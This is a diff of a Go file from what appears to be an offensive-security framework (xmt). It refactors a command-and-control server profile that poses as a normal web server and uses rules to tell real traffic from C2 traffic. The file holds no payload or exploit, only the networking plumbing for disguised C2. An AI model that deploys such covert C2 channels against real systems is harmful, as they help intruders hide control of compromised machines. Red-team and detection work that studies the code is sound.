@@ -1,53 +1,50 @@
 package wc2
 
 import (
-	"bytes"
 	"context"
 	"crypto/tls"
 	"net"
 	"net/http"
 	"os"
-	"sync"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/device/devtools"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-const (
-	empty  = addr("")
-	netWeb = "tcp"
-)
-
-var bufs = &sync.Pool{
-	New: func() interface{} {
-		return new(bytes.Buffer)
-	},
-}
-
-// Server is a C2 profile that mimics a standard web server and client setup. This struct
-// inherits the http.Server struct and can be used to serve real files and pages. Use the
-// Mapper struct to provide a URL mapping that can be used by clients to access the C2 functions.
+// Server is a C2 profile that mimics a standard web server and client setup.
+// This struct inherits the http.Server struct and can be used to serve real files and pages.
+//
+// Use the Target Rules a URL mapping that can be used by clients to access the C2 functions.
 type Server struct {
-	lock sync.RWMutex
-
-	Generator Generator
-	ctx       context.Context
-	tls       *tls.Config
-	dialer    *net.Dialer
-	cancel    context.CancelFunc
-	handler   *http.ServeMux
+	Target  Target
+	tls     *tls.Config
+	dialer  *net.Dialer
+	handler *http.ServeMux
+	ctx     context.Context
+	cancel  context.CancelFunc
 
 	Client *http.Client
 	rules  []Rule
 }
-type fileHandler string
+type directory string
 
 // Close terminates this Web instance and signals all current listeners and clients to disconnect. This
 // will close all connections related to this struct.
+//
+// This function does not block.
 func (s *Server) Close() error {
 	s.cancel()
 	return nil
+}
+
+// TargetAsRule will take the server 'Target' and create a matching ruleset using the 'Rule' function.
+func (s *Server) TargetAsRule() {
+	if s.Target.empty() {
+		return
+	}
+	s.Rule(s.Target.Rule())
 }
 
 // Rule adds the specified rules to the Web instance to assist in determing real and C2 traffic.
@@ -55,18 +52,17 @@ func (s *Server) Rule(r ...Rule) {
 	if len(r) == 0 {
 		return
 	}
-	s.lock.Lock()
 	if s.rules == nil {
 		s.rules = make([]Rule, 0, len(r))
 	}
 	s.rules = append(s.rules, r...)
-	s.lock.Unlock()
 }
 
 // New creates a new Web C2 server instance. This can be passed to the Listen function of a controller to
-// serve a Web Server that also acts as a C2 instance. This struct supports all the default Golang http.Server
-// functions and can be used to serve real web pages. Rules must be defined using the 'Rule' function to allow
-// the server to differentiate between C2 and real traffic.
+// serve a Web Server that also acts as a C2 instance.
+//
+// This struct supports all the default Golang http.Server functions and can be used to serve real web pages.
+// Rules must be defined using the 'Rule' function to allow the server to differentiate between C2 and real traffic.
 func New(t time.Duration) *Server {
 	return NewTLS(t, nil)
 }
@@ -83,7 +79,7 @@ func (s *Server) Serve(p, f string) error {
 		s.handler.Handle(p, http.FileServer(http.Dir(f)))
 		return nil
 	}
-	s.handler.Handle(p, http.FileServer(fileHandler(f)))
+	s.handler.Handle(p, http.FileServer(directory(f)))
 	return nil
 }
 
@@ -96,7 +92,7 @@ func (s *Server) ServeFile(p, f string) error {
 		return err
 	}
 	if !i.IsDir() {
-		s.handler.Handle(p, http.FileServer(fileHandler(f)))
+		s.handler.Handle(p, http.FileServer(directory(f)))
 		return nil
 	}
 	return xerr.New(`path "` + f + `" is not a file`)
@@ -105,19 +101,6 @@ func (s *Server) ServeFile(p, f string) error {
 // Handle registers the handler for the given pattern. If a handler already exists for pattern, Handle panics.
 func (s *Server) Handle(p string, h http.Handler) {
 	s.handler.Handle(p, h)
-}
-func (s *Server) checkMatch(r *http.Request) bool {
-	if len(s.rules) == 0 {
-		return false
-	}
-	s.lock.RLock()
-	defer s.lock.RUnlock()
-	for i := range s.rules {
-		if s.rules[i].checkMatch(r) {
-			return true
-		}
-	}
-	return false
 }
 
 // ServeDirectory attempts to serve the specified filesystem path 'f' at the URL mapped path 'p'. This function is used
@@ -149,14 +132,17 @@ func NewTLS(t time.Duration, c *tls.Config) *Server {
 	w.Client = &http.Client{
 		Timeout: t,
 		Transport: &http.Transport{
-			Dial:                  w.dialer.Dial,
-			Proxy:                 http.ProxyFromEnvironment,
+			Proxy:                 devtools.Proxy,
 			DialContext:           w.dialer.DialContext,
 			MaxIdleConns:          256,
 			IdleConnTimeout:       w.dialer.Timeout,
+			ForceAttemptHTTP2:     false,
 			TLSHandshakeTimeout:   w.dialer.Timeout,
 			ExpectContinueTimeout: w.dialer.Timeout,
 			ResponseHeaderTimeout: w.dialer.Timeout,
+			ReadBufferSize:        1,
+			WriteBufferSize:       1,
+			DisableKeepAlives:     true,
 		},
 	}
 	return w
@@ -164,14 +150,10 @@ func NewTLS(t time.Duration, c *tls.Config) *Server {
 
 // Connect creates a C2 client connector that uses the same properties of the Web struct parent.
 func (s *Server) Connect(a string) (net.Conn, error) {
-	c := &client{gen: s.Generator, host: a, parent: s}
-	if c.gen.empty() {
-		c.gen = DefaultGenerator
-	}
-	return c, nil
+	return connect(&s.Target, s.Client, a)
 }
-func (f fileHandler) Open(_ string) (http.File, error) {
-	return os.OpenFile(string(f), os.O_RDONLY, 0)
+func (d directory) Open(_ string) (http.File, error) {
+	return os.OpenFile(string(d), os.O_RDONLY, 0)
 }
 
 // Listen returns a new C2 listener for this Web instance. This function creates a separate server, but still
@@ -180,28 +162,31 @@ func (s *Server) Listen(a string) (net.Listener, error) {
 	if s.tls != nil && (len(s.tls.Certificates) == 0 || s.tls.GetCertificate == nil) {
 		return nil, com.ErrInvalidTLSConfig
 	}
-	c, err := com.ListenConfig.Listen(context.Background(), netWeb, a)
+	x, err := com.ListenConfig.Listen(s.ctx, "tcp", a)
 	if err != nil {
 		return nil, err
 	}
-	if s.tls != nil {
-		c = tls.NewListener(c, s.tls)
-	}
 	l := &listener{
-		new:    make(chan *conn, 256),
-		parent: s,
-		socket: c,
+		p:     s,
+		ch:    make(chan complete, 1),
+		new:   make(chan *conn, 256),
+		ctx:   s.ctx,
+		rules: make([]Rule, len(s.rules)),
 		Server: &http.Server{
+			Addr:              a,
 			TLSConfig:         s.tls,
 			ReadTimeout:       s.dialer.Timeout,
-			IdleTimeout:       s.dialer.Timeout,
+			IdleTimeout:       0,
 			WriteTimeout:      s.dialer.Timeout,
 			ReadHeaderTimeout: s.dialer.Timeout,
 		},
 	}
-	l.ctx, l.cancel = context.WithCancel(s.ctx)
-	l.Server.Handler, l.Server.BaseContext = l, l.context
-	go l.listen()
+	l.Handler, l.BaseContext = l, l.context
+	if copy(l.rules, s.rules); s.tls != nil {
+		go l.listen(tls.NewListener(x, s.tls))
+	} else {
+		go l.listen(x)
+	}
 	return l, nil
 }
 
